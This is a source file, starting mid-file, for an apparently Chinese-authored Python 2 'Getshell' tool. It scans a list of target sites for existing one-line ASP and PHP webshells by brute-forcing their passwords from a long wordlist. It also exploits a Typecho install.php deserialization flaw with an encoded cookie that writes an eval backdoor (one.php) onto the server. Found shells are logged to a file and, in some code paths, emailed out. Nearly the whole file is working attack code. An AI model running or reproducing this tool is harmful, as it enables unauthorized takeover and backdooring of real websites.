sponse.write("z+=")','hake':'response.write("z+=")','hakecc':'response.write("z+=")','wwwhakecc':'response.write("z+=")','520hack':'response.write("z+=")','hack520':'response.write("z+=")','r4sky':'response.write("z+=")','ghost':'response.write("z+=")','baidu':'response.write("z+=")','daoqq':'response.write("z+=")','daohao':'response.write("z+=")','youaresb':'response.write("z+=")','caonimadebi':'response.write("z+=")','worinima':'response.write("z+=")','wocaonima':'response.write("z+=")','caonimei':'response.write("z+=")','lunnijie':'response.write("z+=")','whatweb':'response.write("z+=")','baidusb':'response.write("z+=")','baiduadmin':'response.write("z+=")','chenxue':'response.write("z+=")','cnot':'response.write("z+=")','xxoxx':'response.write("z+=")','hkk007':'response.write("z+=")','chengnuo':'response.write("z+=")','wrsk':'response.write("z+=")','wrsky':'response.write("z+=")','yuemo':'response.write("z+=")','4lert':'response.write("z+=")','maek ':'response.write("z+=")','dreamh':'response.write("z+=")','Shell':'response.write("z+=")','shell':'response.write("z+=")','10011C120105101':'response.write("z+=")','fclshark':'response.write("z+=")','19880118':'response.write("z+=")','376186027':'response.write("z+=")','535039':'response.write("z+=")','darkst':'response.write("z+=")','jcksyes':'response.write("z+=")','jinjin':'response.write("z+=")','sq19880602':'response.write("z+=")','jtk2352':'response.write("z+=")','kill':'response.write("z+=")','haode':'response.write("z+=")','chuang':'response.write("z+=")','aiezu':'response.write("z+=")','981246':'response.write("z+=")','et520':'response.write("z+=")','lx':'response.write("z+=")','lengxue':'response.write("z+=")','aoyunhui':'response.write("z+=")','fucker':'response.write("z+=")','tiger':'response.write("z+=")','tag':'response.write("z+=")','iloveshell':'response.write("z+=")','yrpx':'response.write("z+=")','air':'response.write("z+=")','ceshi2009':'response.write("z+=")','kissy':'response.write("z+=")','3452510':'response.write("z+=")','rfkl':'response.write("z+=")','847381979':'response.write("z+=")','jing':'response.write("z+=")','winner':'response.write("z+=")','4816535':'response.write("z+=")','shaomo':'response.write("z+=")','zhack':'response.write("z+=")','mama':'response.write("z+=")','mama520':'response.write("z+=")','Fuckyou':'response.write("z+=")','FuckYou':'response.write("z+=")','lengfeng':'response.write("z+=")','lengfengsk':'response.write("z+=")','rensheng':'response.write("z+=")','123go':'response.write("z+=")','xiaowu':'response.write("z+=")','Baike':'response.write("z+=")','admin888':'response.write("z+=")','honker':'response.write("z+=")','hongker':'response.write("z+=")','liner':'response.write("z+=")','xiaoyi':'response.write("z+=")','xiaoe':'response.write("z+=")','login':'response.write("z+=")','Evav':'response.write("z+=")','13572468':'response.write("z+=")','Sa':'response.write("z+=")','sa':'response.write("z+=")','sasa':'response.write("z+=")','dangdang':'response.write("z+=")','webshell':'response.write("z+=")','lovehack7758':'response.write("z+=")','hkmm':'response.write("z+=")','133135136':'response.write("z+=")','80sec':'response.write("z+=")','G.xp':'response.write("z+=")','gxp':'response.write("z+=")','1992724':'response.write("z+=")','satan':'response.write("z+=")','Satan':'response.write("z+=")','yong':'response.write("z+=")','fst':'response.write("z+=")','f.s.t':'response.write("z+=")','F.S.T':'response.write("z+=")','noid':'response.write("z+=")','sadness':'response.write("z+=")','caodan':'response.write("z+=")','96315001':'response.write("z+=")','axiao ':'response.write("z+=")','847381979 ':'response.write("z+=")','bzxyd ':'response.write("z+=")','tonecan ':'response.write("z+=")','5201314 ':'response.write("z+=")','3est ':'response.write("z+=")','sin ':'response.write("z+=")','654321 ':'response.write("z+=")','ghost ':'response.write("z+=")','evil':'response.write("z+=")','evilhk':'response.write("z+=")','evilhack':'response.write("z+=")','evilhacker':'response.write("z+=")','ying':'response.write("z+=")','webadmin':'response.write("z+=")','webadmin2':'response.write("z+=")','HqzX':'response.write("z+=")','tengxin':'response.write("z+=")','tengxunsb':'response.write("z+=")','danteng':'response.write("z+=")','rusuan':'response.write("z+=")','dantong':'response.write("z+=")','youguest':'response.write("z+=")','cmdshell':'response.write("z+=")','Webshell':'response.write("z+=")','WebShell':'response.write("z+=")','sh3ll':'response.write("z+=")','ufohack':'response.write("z+=")','jiaozu':'response.write("z+=")','huaidan':'response.write("z+=")','jiaozhu':'response.write("z+=")','lover':'response.write("z+=")','daoker':'response.write("z+=")','daokers':'response.write("z+=")','guige':'response.write("z+=")','55103839':'response.write("z+=")','551416':'response.write("z+=")','2018':'response.write("z+=")','2017':'response.write("z+=")','2015':'response.write("z+=")','2014':'response.write("z+=")','2012':'response.write("z+=")','QQ':'response.write("z+=")','diaosi':'response.write("z+=")','tcb':'response.write("z+=")','ttc':'response.write("z+=")','T00ls':'response.write("z+=")'}

headers={
	'User-Agent': 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)'
}

one_password=[
'one',
'coco',
'expsky',
'369369',
'kg',
'yu',
'laobiao',
'nimabi123',
'-62',
'sqzr',
'vales',
'mowang',
'check_license',
'shiban',
'rmb2014',
'xise',
'aba',
'tuhao',
'lan',
'ysh',
'diaosi',
'!@#123',
'a',
'1',
'#',
'l',
'cmd',
'diy',
'cnnsc',
'value',
'system',
'sys',
'369369',
'hack',
'hack88',
'hacker',
'fuck',
'shit',
'pass',
'guji',
'gufeng',
'password',
'pwd',
'passwd',
'pswd',
'mima',
'mm',
'go',
'do',
'ok',
'test',
'hansoncn',
'shadow',
'ah',
'ala520',
'zanghua',
'jimkk1',
'pa',
'fk',
'wenzi',
'xiao',
'xiaolu',
'key',
'lv',
'shell',
'sh',
'dirshell',
'sysshell',
'no',
'loveu',
'love',
'wrsky',
'zz',
'3321',
'12345',
'123456',
'123',
'109',
'aoyunwan',
'textarea1',
'wxy',
'zjg',
'b',
'c',
'd',
'e',
'f',
'g',
'h',
'i',
'j',
'k',
'm',
'n',
'o',
'p',
'q',
'r',
's',
't',
'u',
'v',
'w',
'x',
'y',
'z',
'2',
'3',
'4',
'5',
'6',
'7',
'8',
'9',
'0',
'',
'',
'584521',
'nohack',
'45189946',
'hacksb',
'hackersb',
'heixiaozi',
'360',
'sb360',
'yushiwuzheng',
'spider',
'angel',
'4ngel',
'yyswxws',
'lcx',
'8238838',
'456655',
'test1',
'test2',
'test3',
'test5',
'Administrator',
'system',
'fuck',
'fuckyou',
'admin',
'MASTER',
'master',
'root',
'super',
'administrator',
'h4ck',
'h4ck3r',
'7788414',
'******',
'********',
'love',
'loveu',
'forgot',
'space',
'20080808',
'666666',
'888888',
'%null%',
'%username%',
'123456',
'12345678',
'123456789',
'111111',
'11111111',
'000',
'000000',
'88888888',
'123123',
'5201314',
'1234567890',
'aaaaaa',
'654321',
'999999',
'123321',
'222222',
'7758521',
'iloveyou',
'password',
'121212',
'qazwsx',
'112233',
'1314520',
'11223344',
'333333',
'987654321',
'888999',
'0123456789',
'zxcvbnm',
'windows',
'789456',
'999999999',
'22222222',
'7777777',
'7758258',
'520520',
'168168',
'wwwwww',
'555555',
'asdfgh',
'147258',
'qwerty',
'1qaz2wsx',
'12344321',
'xxxxxx',
'960628',
'55555555',
'111222',
'asdfghjkl',
'abc123',
'31415926',
'ffffff',
'zzzzzz',
'abcd1234',
'12121212',
'haha',
'hahaha',
'101010',
'!@#$',
'!@#$%',
'!@#$%^',
'!@#$%^&',
'!@#$%^&*',
'%username%!@#$',
'tkfkdgo',
'1004',
'2580',
'asd123',
'1q2w3e',
'shinhwa',
'tlsghk',
'909',
'apt1306',
'326',
'bb7234',
'201977',
'dkssud',
'qlalf',
'diddnjs76',
'1024',
'1228',
'10040907',
'1114',
'1123',
'780314',
'70',
'292513',
'1030',
'7981',
'sksmssk',
'Wkwmdsk',
'wjstjf',
'2000',
'DHFPSWL',
'1113',
'918',
'7979',
'rkskekfk',
'1318',
'sotkfkd',
'7942',
'821',
'1225',
'wjswlgus',
'5tmdgks',
'134679',
'cjttkfkd',
'qkqhek',
'159357',
'1313',
'djajsl',
'1895',
'1127',
'1226',
'780607',
'qkqhdi',
'815',
'2357',
'gg8008',
'1229',
'1042',
'730',
'7418',
'apfhd',
'1818',
'qudtls',
'dkagh',
'960907',
'5082',
'9484erp',
'aldksgo',
'3578',
'1928',
'ss0808',
'5567103',
'90718',
'forever',
'204906',
'3256',
'q1w2e3',
'zaq123',
'sh0324',
'rhdwnsla',
'625',
'skskfdl',
'1204',
'1730',
's93470970',
'2848048',
'gksrmf97',
'1092',
'4fkdgo',
'kjs4020',
'48010',
'a1b2c3',
'hiphop',
'aeotjd13',
'pys5936',
'a8851642',
'tkfkdgod',
'7896',
'a7734',
'123qwe',
'305',
'todrkr',
'hs7771',
'1969',
'1118',
'a12345',
'78451296',
'1012',
'6420383',
'7960',
'dnflwlq',
'93493400',
'981011',
'ajdcjddl',
'sh5531',
'9604',
'wlgml84',
'akdntm2',
'kim1968',
'eric2456',
'102030',
'rlarkdfks',
'dkfktl',
'ha2426',
'902',
'1126611',
'tjdgml',
'ks1220',
'8522554',
'1357',
'rhaehfdl',
'hoi486',
'vnflsl',
'704',
'132435',
'1880',
'wjddms',
'1264ce',
'73217',
'tkfkdgody',
'4885',
'hbjn3165',
'hee1026',
'4266',
'38317',
'seo123to',
'as1234',
'godqhr',
'741963',
'tkfdkdgo',
'gmlwns',
'124',
'f123456',
'love1052',
'794613',
'alclssja',
'gksksla',
'890214',
'zhfldk',
'rlwkr1',
'1994',
'12354568',
'vldksh',
'gusrud',
'foro12',
'nc',
'hackqingshu',
'qingshu$',
'sz',
'sunzi',
'shunzi',
'123!@#',
'123654',
'123654789',
'123654789!',
'123654789.',
'aspadmin',
'phpadmin',
'jspadmin',
'aspxadmin',
'noadmin',
'cms',
'iamnotadmin',
'fuckit',
'fuckhack',
'fuckhacker',
'F19ht',
'f19ht',
'fight',
'hkmjj',
'chinared',
'ouou',
'hake',
'hakecc',
'wwwhakecc',
'520hack',
'hack520',
'r4sky',
'ghost',
'baidu',
'daoqq',
'daohao',
'youaresb',
'caonimadebi',
'worinima',
'wocaonima',
'caonimei',
'lunnijie',
'whatweb',
'baidusb',
'baiduadmin',
'chenxue',
'cnot',
'xxoxx',
'hkk007',
'chengnuo',
'wrsk',
'wrsky',
'yuemo',
'4lert',
'maek ',
'dreamh',
'Shell',
'shell',
'10011C120105101',
'fclshark',
'19880118',
'376186027',
'535039',
'darkst',
'jcksyes',
'jinjin',
'sq19880602',
'jtk2352',
'kill',
'haode',
'chuang',
'aiezu',
'981246',
'et520',
'lx',
'lengxue',
'aoyunhui',
'fucker',
'tiger',
'tag',
'iloveshell',
'yrpx',
'air',
'ceshi2009',
'kissy',
'3452510',
'rfkl',
'847381979',
'jing',
'winner',
'4816535',
'shaomo',
'zhack',
'mama',
'mama520',
'Fuckyou',
'FuckYou',
'lengfeng',
'lengfengsk',
'rensheng',
'123go',
'xiaowu',
'Baike',
'admin888',
'honker',
'hongker',
'liner',
'xiaoyi',
'xiaoe',
'login',
'Evav',
'13572468',
'Sa',
'sa',
'sasa',
'dangdang',
'webshell',
'lovehack7758',
'hkmm',
'133135136',
'80sec',
'G.xp',
'gxp',
'1992724',
'satan',
'Satan',
'yong',
'fst',
'f.s.t',
'F.S.T',
'noid',
'sadness',
'caodan',
'96315001',
'axiao ',
'847381979 ',
'bzxyd ',
'tonecan ',
'5201314 ',
'3est ',
'sin ',
'654321 ',
'ghost ',
'evil',
'evilhk',
'evilhack',
'evilhacker',
'ying',
'webadmin',
'webadmin2',
'HqzX',
'tengxin',
'tengxunsb',
'danteng',
'rusuan',
'dantong',
'youguest',
'cmdshell',
'Webshell',
'WebShell',
'sh3ll',
'ufohack',
'jiaozu',
'huaidan',
'jiaozhu',
'lover',
'daoker',
'daokers',
'guige',
'55103839',
'551416',
'2018',
'2017',
'2015',
'2014',
'2012',
'QQ',
'diaosi',
'tcb',
'ttc',
'T00ls'
]
	



flag = 1#judge if the bad keyword in url			

def url_encoder(url):#http://***.com
	url = url.replace("\n","")
	url = url if url.startswith("http") else 'http://'+url 
	if (url[len(url)-1]=='/'):
		url = url[0:len(url)-1]
	return url

def thread_exploite(url):
	if "asp" in url:
		for password_asp in one_password:
			password_asp = password_asp.replace("\n","")
			data_asp = {password_asp:'response.write("z+=")'}
			
			try:
				html_asp = requests.post(url=url,headers=headers,data=data_asp,timeout=3)
				#print "woquni"
				if (html_asp.text.find("z+=")>=0):
					sssss = throw_all_password_asp(url,password_asp)
					if sssss=="Ok":
						send_email(str(url+"|"+password_asp))
						print "May Getshell-->"+url+"|"+password_asp
						send_email_3(str(url+"|"+password_asp))
						fxx = open('shell.txt','a')
						fxx.write(str(url+" "+password_asp)+"\n")
						fxx.close()
						break
					else:
						pass
				else:
					pass	
				html_asp.close()
			except Exception ,e:
				print e
				
				pass
	elif "php" in url:
		for password_php in one_password:
			password_php = password_php.replace("\n","")
			data_php = {password_php:'echo "z+=";'}
			try:
				html_php = requests.post(url=url,headers=headers,data=data_php,timeout=3)

				if (html_php.text.find("z+=")>=0):
					ssss = throw_all_password_php(url,password_php)
					if ssss=="Ok":
						
						print "May Getshell-->"+url+"|"+password_php
						
						fxx = open('shell.txt','a')
						fxx.write(str(url+"|"+password_php)+"\n")
						fxx.close()
						break
					else:
						pass
				else:
					wo="wo"
					#print url_true		
				html_php.close()
			except Exception ,e:
				print e
				pass
	else:
		print "daye"
		
def throw_all_password_asp(url,password_all_asp):#for the website is ok to all password is ok
	data_all_asp = {'otherpassword':'response.write("z+=")'}
	try:
		html_asp = requests.post(url=url,headers=headers,data=data_all_asp,timeout=5)
		
		if(html_asp.text.find("z+=")>=0):
			return "No"
		else:
			return "Ok"
		
	except Exception ,e:
		print e
		return "No"		
	
def throw_all_password_php(url,password_all_php):#for the website is ok to all password is ok
	data_all_php = {'otherpassword':'echo "z+=";'}
	try:
		html_php = requests.post(url=url,headers=headers,data=data_all_php,timeout=5)
		
		if(html_php.text.find("z+=")>=0):
			return "No"
		else:
			return "Ok"
	except Exception ,e:
		print e
		return "No"
	
def typecho(url):
    ref = url + '/admin/'
    furl = url+'/install.php?finish=1'
    headers = {
        'User-Agent': 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)',
        'Referer': ref,
		'cookie':"__typecho_config=YToyOntzOjc6ImFkYXB0ZXIiO086MTI6IlR5cGVjaG9fRmVlZCI6NTp7czoyMDoiAFR5cGVjaG9fRmVlZABfaXRlbXMiO2E6MTp7aTowO2E6MTp7czo2OiJhdXRob3IiO086MTU6IlR5cGVjaG9fUmVxdWVzdCI6Mjp7czoyNDoiAFR5cGVjaG9fUmVxdWVzdABfcGFyYW1zIjthOjE6e3M6MTA6InNjcmVlbk5hbWUiO3M6NTk6ImZpbGVfcHV0X2NvbnRlbnRzKCdvbmUucGhwJywgJzw/cGhwIEBldmFsKCRfUE9TVFtvbmVdKTs/PicpIjt9czoyNDoiAFR5cGVjaG9fUmVxdWVzdABfZmlsdGVyIjthOjE6e2k6MDtzOjY6ImFzc2VydCI7fX19fXM6MjI6IgBUeXBlY2hvX0ZlZWQAX3ZlcnNpb24iO2k6MTtzOjE5OiIAVHlwZWNob19GZWVkAF90eXBlIjtzOjc6IlJTUyAyLjAiO3M6MjI6IgBUeXBlY2hvX0ZlZWQAX2NoYXJzZXQiO3M6NToiVVRGLTgiO3M6MTk6IgBUeXBlY2hvX0ZlZWQAX2xhbmciO3M6MjoiZW4iO31zOjY6InByZWZpeCI7czo3OiJ0eXBlY2hvIjt9"
        }
    try:
        rsp = requests.get(url=furl,headers=headers,timeout=3)
        if rsp.status_code == 404:
            print 'sorry!install.php is not exist.'
            rsp.close()
            return -1
	if len(requests.get(url=url+'/one.php',timeout=4).content)==0:
		second_flag = second_judge(url)
		if second_flag=="Yes":
			send_email(url+'/one.php|one')
			send_email_3(url+'/one.php|one')
			f_2 = open('shell.txt','a')
			rsp.close()
			f_2.write(str(url+'/one.php|one')+"\n")
			print 'shell\'s site: ', url + '/one.php|one'
			f_2.close()
		else:
			pass
    except Exception ,e:
        print e
        return -1
		
def second_judge(url):#second judge typecho's shell
	data = {'one':'echo "z+=";'}
	try:
		html = requests.post(url=url,data=data,headers=headers,timeout=3)
		if(html.status_code==200):
			if(html.text.find("z+=")>=0):
				return "Ok"
			else:
				return "No"
		else:
			return "No"
	except Exception ,e:
		print e
		return "No"
		
		
	
	
def begin():
	fp = open('url.txt','r')
	lists = fp.readlines()
	for url in lists:
		flag = 1
		for bad in getout:
			if bad in url:
				flag = 0
				break
			
		if flag!=0:
			url = url_encoder(url)
			str = begin_true_url(url)
		else:
			flag = 1
		


		
def begin_true_url(url):
	typecho(url)
	for trace in all_traces:
		try:
			trace = trace.replace("\n","")
			if trace[0]!='/':
				trace = '/'+trace
			url_true = url+trace
			if "asp" in url_true:#asp's traces
				html = requests.post(url_true,headers=headers,timeout=3,data=data_asp,allow_redirects=False)
				
			elif "php" in url_true:#php's traces
				html = requests.post(url_true,headers=headers,timeout=3,data=data_php,allow_redirects=False)
				
			else:
				continue
			if html.status_code!=200:
				print url_true
				html.close()
				continue
			else:
				if(html.text.find("z+=")>=0):
					thread_exploite(url_true)
					html.close()
					return "yes"
				else:
					pass
		except Exception ,e:
			return "yes"
		return "no"


def show_me():
	log = """
000         000      +000000
 000       000      00
  000     000      00
   000   000       00
    000 000        00
      000          00
      000          00
      000          00
      000           00  
      000            +000000
	  http://www.lang-v.com
{Author:lang,hai,yc   Version 1.1   QQ:597635298}
	"""
	print log

if __name__=='__main__':
	show_me
	keys = "c2FvaGFpK3llY2hlbmc="
	
	if keys=="c2FvaGFpK3llY2hlbmc=":
	#if keys=="wo":
		root = Tk()
		root['height'] = 300
		root['width'] = 400
		root.title("Getshell")
		root['bg']='#000000'
		Button(root,text="Getshell",command=begin).pack()
		root.mainloop()
	else:
		print "Bad password"
		sys.exit(0)